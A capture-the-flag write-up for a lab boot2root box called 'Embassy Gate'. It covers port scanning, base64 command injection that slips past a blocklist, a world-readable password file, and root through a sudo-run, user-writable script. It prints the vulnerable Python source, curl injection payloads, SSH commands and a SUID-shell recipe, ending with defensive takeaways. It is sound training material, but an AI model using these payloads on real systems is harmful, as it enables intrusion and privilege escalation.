<div align="center">

<a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=28&duration=700&pause=1000&color=E8423F&center=true&vCenter=true&repeat=false&width=500&height=35&lines=Embassy+Gate" alt="Typing SVG" /></a>

</div>

# Embassy Gate — PWN · JID-Pwn204 · Level 1 · 🟡 MEDIUM

- **Status:** ✅ SOLVED (4/4) — full boot2root chain; root flag submitted and accepted (800 pts).
- **Points:** 1800 / 1800 (ports 200 · user 300 · user flag 500 · root 800)
- **Flags:** Open TCP ports → Low privilege user → User flag → Root flag (`CTF{...}` for the file flags)
- **Target:** `10.10.10.24` (lab, over WireGuard VPN)
- **Prompt:** *"Embassy gate" — boot2root chain.*

| # | Flag | Answer | Status |
|---|------|--------|--------|
| 1 | Open TCP ports | `22,8085` | ✅ |
| 2 | Low privilege user | `envoy` | ✅ |
| 3 | User flag | `CTF{8c5adf3eeced5c9c875b3fecbec55551}` | ✅ |
| 4 | Root flag | contents of `/root/root.txt` (`CTF{...}`, accepted) | ✅ |

---

## TL;DR

1. `nmap` → `22,8085` (SSH on the standard port 22 this time); the `:8085` "Embassy gate" app exposes `POST /enroll` with a base64 `name`.
2. The shell-metacharacter blocklist runs on the base64 *text*, never the decoded command → always bypassed; `subprocess.run(decoded, shell=True)` as `www-data` = RCE.
3. Read world-readable `/opt/embassy/envoy.pass` (`velvet-2`) → SSH `envoy` → `user.txt`; `sudo NOPASSWD /opt/embassy/sync` runs envoy-writable `sync.sh` as root → root flag.

7th sibling of the JID boot2root series (cf. `HarborWatch`, `NightWatchRoster`, `EscortConvoy`, `VisitorBadges`, `RadioShack`, `CoastalRadar`). Same skeleton — 2 open ports (SSH + Python `BaseHTTPServer`), Flag1 = ports, Flag2 = theme-derived user, Flag3 = `/home/user.txt`, Flag4 = root via a sudo misconfig — but the **foothold is different**: the HTTP app is a base64-gated **command-injection** endpoint, not a file-read. recon → `POST /enroll` runs your base64-decoded input through `shell=True` as `www-data` → read the world-readable `envoy.pass` → SSH as `envoy` → `sudo NOPASSWD /opt/embassy/sync` runs an envoy-owned script as root.

> All commands run manually by the player (CLAUDE.md rule 1). Claude never touched the box.

---

## 0. Connect to the lab

```bash
cd /home/felipebc2/repo/CTF/CentinelI          # the team-71-player-a.conf lives here (never read/commit it)
sudo wg-quick up ./team-71-player-a.conf
ping -c1 10.10.10.24
```

---

## Recon — Flag 1: Open TCP ports

```bash
sudo nmap -sS -p- -T4 --max-retries 6 -Pn -n 10.10.10.24 -oN nmap-24-full.txt
sudo nmap -sC -sV -p 22,8085 -Pn -n 10.10.10.24 -oN nmap-24-svc.txt
```
```
22/tcp   open ssh  OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
8085/tcp open http BaseHTTPServer 0.6 (Python 3.11.2)  -- title "Embassy gate"
```

> Note the twist vs. the siblings: **SSH is on the standard port 22**, not a high port. SSH 9.2p1 is patched → not the vector. The custom Python app on :8085 is the attack surface.

**Flag 1** = `22,8085`

---

## Foothold — Flag 2: Low privilege user (`www-data` RCE → `envoy`)

The app (`GET /`) shows a form `POST /enroll` with `name=...` and the hint **"Device names are stored encoded."**

### Fingerprinting the encoding

Submitting raw strings told the whole story:

| input | result | why |
|-------|--------|-----|
| `bob`, `hello`, `zz` | `400 bad encoding` | not valid base64 |
| `QUJD` ("ABC"), `aGk=` ("hi") | `200` → `/bin/sh: 1: ABC: not found` | **decoded, then executed in a shell** |

So `name` is **base64**, decoded and run through a shell. The decoded `"hi"`/`"ABC"` came back as `sh: not found` → **command injection**.

### Confirmed by the source

`cat /opt/app/web.py` (read later via the RCE itself):

```python
def do_POST(self):
    raw = self.form().get("name", [""])[0]
    if any(ch in raw for ch in ";|&`$()"):      # filter runs on the BASE64 text, not the command
        self.send(400, "rejected"); return
    try:
        decoded = base64.b64decode(raw).decode()
    except Exception:
        self.send(400, "bad encoding"); return
    proc = subprocess.run(decoded, shell=True, capture_output=True, text=True)
    self.send(200, proc.stdout + proc.stderr, "text/plain; charset=utf-8")
```

**The bug:** the blocklist (`;|&`$()`) is checked against the **raw base64 string**. The base64 alphabet (`A-Za-z0-9+/=`) never contains those characters, so the filter *always* passes, while the decoded payload can contain any shell metacharacter. Trivial, total bypass.

### Exploitation pattern

Encode locally, send with `--data-urlencode` (protects `+ / =` from form-parsing):

```bash
printf '%s' 'id; ls -la /home; grep -E "/bin/(ba)?sh$" /etc/passwd' | base64 -w0   # build payload
curl -sS --data-urlencode 'name=<BASE64>' http://10.10.10.24:8085/enroll; echo      # run it, output reflected
```

Enumeration results:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)      # id  -> the app runs as www-data
-r-------- 1 envoy envoy  38  /home/user.txt               # ls /home -> user.txt is envoy-only
envoy:x:1000:1000::/home/envoy:/bin/bash                   # /etc/passwd -> the UID-1000 human
```

**Flag 2** (low-priv username) = `envoy`

---

## User flag — Flag 3

`www-data` can't read `/home/user.txt` (mode `0400`, owner `envoy`). Enumerating `/opt` (the app tree) turned up a **world-readable** credential file:

```
/opt/embassy/envoy.pass   -rw-r--r-- 1 root root 9      # readable by www-data
```
```bash
curl -sS --data-urlencode 'name='"$(printf '%s' 'cat /opt/embassy/envoy.pass' | base64 -w0)" http://10.10.10.24:8085/enroll
# velvet-2
```

SSH in as `envoy` and read the flag:

```bash
sshpass -p 'velvet-2' ssh -p 22 -o StrictHostKeyChecking=no envoy@10.10.10.24 'cat /home/user.txt'
```

**Flag 3** = `CTF{8c5adf3eeced5c9c875b3fecbec55551}`

---

## Privesc — Flag 4: Root flag

`sudo -l` as `envoy`:

```
User envoy may run the following commands on <host>:
    (root) NOPASSWD: /opt/embassy/sync
```

`/opt/embassy/sync` (root-owned) simply runs an **envoy-owned, envoy-writable** script:

```bash
# /opt/embassy/sync
#!/bin/bash
bash /home/envoy/sync.sh          # /home/envoy/sync.sh is -rwxr-xr-x envoy envoy
```

So `envoy` controls what runs as root. Put the read in `sync.sh`, then invoke the sudo rule:

```bash
sshpass -p 'velvet-2' ssh -p 22 -o StrictHostKeyChecking=no envoy@10.10.10.24 \
  'printf "#!/bin/sh\ncat /root/root.txt\n" > /home/envoy/sync.sh; chmod +x /home/envoy/sync.sh; sudo -n /opt/embassy/sync'
```

`sudo /opt/embassy/sync` → `bash /home/envoy/sync.sh` as root → `cat /root/root.txt` with uid=0.

**Flag 4** = `CTF{...}` (root.txt — submitted & accepted on the platform, 800 pts).

(For an interactive root shell instead: write `cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash` into `sync.sh`, `sudo -n /opt/embassy/sync`, then `/tmp/rootbash -p`.)

---

## Summary / Chain

| # | Flag | Value | Vector |
|---|------|-------|--------|
| 1 | Open TCP ports | `22,8085` | `nmap -p-` (SSH on 22 this time) |
| 2 | Low privilege user | `envoy` | `POST /enroll` base64 → `subprocess.run(shell=True)` RCE as www-data; blocklist checked on base64 text → always bypassed; `/etc/passwd` → UID-1000 |
| 3 | User flag | `CTF{8c5adf3eeced5c9c875b3fecbec55551}` | world-readable `/opt/embassy/envoy.pass` = `velvet-2` → SSH envoy → `/home/user.txt` |
| 4 | Root flag | `CTF{...}` | `sudo NOPASSWD /opt/embassy/sync` runs envoy-writable `/home/envoy/sync.sh` as root |

### Takeaways
- **Validate the decoded value, not the wire format.** Blocklisting shell metacharacters on the *base64* string is security theater — the dangerous bytes only exist after decoding. And never `subprocess.run(user_input, shell=True)` at all.
- **World-readable secrets.** `envoy.pass` was `0644`; a service password belongs in `0600`/root-only and ideally not on disk next to the web root.
- **Don't let a low user own a script a root job runs.** `sudo NOPASSWD` on a wrapper that `bash`-es a user-writable file is a direct root handoff — the classic series ending (cf. VisitorBadges `source`, RadioShack pickle).
- **The series varies the foothold every box** (traversal / TCP leak / XOR log / here command-injection) but keeps the same privesc shape. Read the app, don't assume the prior box's vector.

### Note
- Claude ran nothing against the target; every command was executed manually by the player (0 wrong submissions on this box).
